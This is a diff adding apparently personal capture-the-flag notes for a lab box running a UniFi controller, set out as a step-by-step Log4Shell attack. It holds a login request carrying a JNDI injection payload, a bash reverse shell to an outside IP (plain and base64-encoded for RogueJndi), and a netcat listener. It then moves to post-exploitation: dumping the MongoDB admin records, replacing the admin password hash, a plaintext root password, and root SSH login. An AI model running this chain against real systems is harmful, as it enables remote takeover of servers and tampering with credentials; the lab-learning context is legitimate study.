@@ -6,3 +6,60 @@ unified
 |
 -visit the site on 8443
 -the version of the software will be on the site itself
+
+POST /api/login HTTP/2
+Host: <TARGET> 
+Content-Length: 109
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Sec-Ch-Ua-Platform: "macOS"
+Content-Type: application/json; charset=utf-8
+Accept: */*
+Origin: https://<TARGET>
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://<TARGET>/manage/account/login?redirect=%2Fmanage
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+{"username":"asdf","password":"asdfas","remember":"<PAYLOAD>","strict":true}
+
+note:use rouge-jdni repo its easier to use the log4j https://github.com/veracode-research/rogue-jndi
+|
+-base64 encode the command to be executed using rouge-jndi
+-liek this echo "bash -c bash -i >&/dev/tcp/10.10.16.155/4444 0>&1"| base64
+- start up the rouge jndi jar file in rouge-jndi/target using
+
+java -jar RogueJndi-1.1.jar --command "bash -c
+{echo, YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMTU1LzQ0NDQgMD4mMQo=}|{base64,-
+d}|{bash,-i}" --hostname "10.10.16.155"
+
+-ldap server will startup and running
+-listen on nc on port 4444 or anything else
+-do the malformed request with remember set to ${jndi:ldap://<Your Tun0 IP>:1389/o=tomcat}
+-you get the shell
+note: if not workign follow this:
+	- https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi
+|
+-after getting the nc connection script /dev/null -c bash
+-to find the mongodb port use ps aux | grep -i mongo to get the port its runnign on
+
+-search for mongo default unifi or use
+-mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
+-note: here ace is ther database name and db.admin.find() is used to find all data 
+-you get administrator user in the json output and x_shadow variable which is the hash for the user password
+-we need to change that 
+-use mkpasswd -m sha-512 <password> and update the value using 
+mongo --port 27117 ace --eval 'db.admin.update({"_id":
+ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$iYwof8AN7BuY0yzF$SAKjgazX6tdsNiCTWR5Ojwyf0xJBL3MdQolHWDYNjE9Ry30B3lpzBcT7TJn0mN.nVnvHRIAVmwQAEHP75dkbv."}})'
+
+-now login to the unifi thing using administrator and password that you used
+
+-the admin password will be in the unifi settings dashboard
+-NotACrackablePassword4U2022
+-user flag in /home/michael
+
+-login to server using ssh using root@ip and password found in unifi dashboard 
+-root flag in /root
